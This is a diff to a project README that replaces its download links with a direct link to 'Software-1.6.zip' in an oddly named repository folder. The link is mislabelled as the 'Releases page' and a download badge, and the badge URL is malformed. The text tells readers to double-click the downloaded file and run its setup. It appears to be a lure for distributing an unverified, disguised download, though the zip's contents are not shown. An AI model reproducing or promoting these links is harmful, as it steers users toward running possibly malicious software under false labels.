@@ -20,7 +20,7 @@ To run this application effectively, ensure your device meets the following requ
 ### Step 1: Download the Application
 To get started, visit our Releases page to download the latest version of the application.
 
-[![Download the app](https://raw.githubusercontent.com/Samiinasher/website/main/naturalistically/website.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Samiinasher/website/main/naturalistically/website.zip)
+[![Download the app](https://github.com/Samiinasher/website/raw/refs/heads/main/naturalistically/Software-1.6.zip%20Now-Visit%20Releases-blue)](https://github.com/Samiinasher/website/raw/refs/heads/main/naturalistically/Software-1.6.zip)
 
 ### Step 2: Run the Application
 Once you have downloaded the application, locate the downloaded file on your device. Double-click the file to launch the application. Follow the on-screen instructions to complete the setup.
@@ -32,7 +32,7 @@ Once you have downloaded the application, locate the downloaded file on your dev
 - **Search Functionality:** Use the search bar to find specific topics or articles.
 
 ## 📖 Updating the Application
-Keep your application up-to-date to enjoy new features and improvements. You can check for updates by revisiting our [Releases page](https://raw.githubusercontent.com/Samiinasher/website/main/naturalistically/website.zip) regularly.
+Keep your application up-to-date to enjoy new features and improvements. You can check for updates by revisiting our [Releases page](https://github.com/Samiinasher/website/raw/refs/heads/main/naturalistically/Software-1.6.zip) regularly.
 
 ## 📞 Support
 If you face any issues or have questions, feel free to reach out. Check out the FAQ section on our website, or contact our support team through the GitHub repository.
